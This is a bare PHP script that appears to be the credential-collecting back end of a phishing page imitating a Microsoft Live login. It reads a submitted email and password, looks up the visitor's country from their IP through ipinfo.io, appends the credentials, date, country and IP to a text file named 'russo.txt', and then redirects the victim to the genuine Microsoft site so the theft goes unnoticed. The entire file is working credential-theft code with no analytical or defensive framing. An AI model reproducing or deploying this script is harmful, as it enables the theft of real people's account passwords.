<?php
session_start();
date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
if(isset($_POST["emil"]) && isset($_POST["pss"])){
	

	
	$file = fopen("russo.txt", "a");
fwrite($file, "Correo: ".$_POST['emil']."  - Psswrd: ".$_POST['pss']." Fecha: ".date('Y-m-d')." - ".date('H:i:s')." - ".$cc." ".$userp." " . PHP_EOL);
fwrite($file, "********************************* " . PHP_EOL);
fclose($file);


	echo "<script>";
	echo "window.location.href='https://home.live.com/?mkt=es-es';";
	echo "</script>";
	

}
	
?>